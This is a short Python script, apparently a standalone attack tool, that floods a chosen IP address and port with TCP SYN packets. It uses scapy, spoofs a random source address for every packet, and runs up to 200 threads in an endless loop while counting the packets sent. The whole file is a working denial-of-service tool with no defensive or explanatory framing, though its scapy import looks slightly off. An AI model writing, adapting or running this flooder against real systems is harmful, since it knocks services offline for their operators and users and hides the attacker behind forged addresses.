#!/usr/bin/env python

import socket
import random
import sys
import threading
import scapy 

# power configuration

interface    = None
target       = None
port         = None
thread_limit = 200
total        = 0



class sendSYN(threading.Thread):
	global target, port
	def __init__(self):
		threading.Thread.__init__(self)

	def run(self):
		
		i = scapy.IP()
		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254), random.randint(1,254))
		i.dst = target

		t = scapy.TCP()
		t.sport = random.randint(1,65535)
		t.dport = port
		t.flags = 'S'

		scapy.send(i/t, verbose=0)

if __name__ == "__main__":
	if len(sys.argv) != 4:
		print ("Usage: %s <Interface> <Target IP> <Port>" % sys.argv[0])
		exit()


	interface        = sys.argv[1]
	target           = sys.argv[2]
	port             = int(sys.argv[3])
	scapy.conf.iface = interface

	print ("Flooding %s:%i with SYN packets." % (target, port))
	while True:
		if threading.activeCount() < thread_limit: 
			sendSYN().start()
			total += 1
			sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)

